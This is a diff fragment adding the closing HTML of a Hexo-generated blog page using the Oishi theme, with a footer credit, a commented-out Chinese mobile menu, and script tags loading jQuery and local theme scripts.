+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
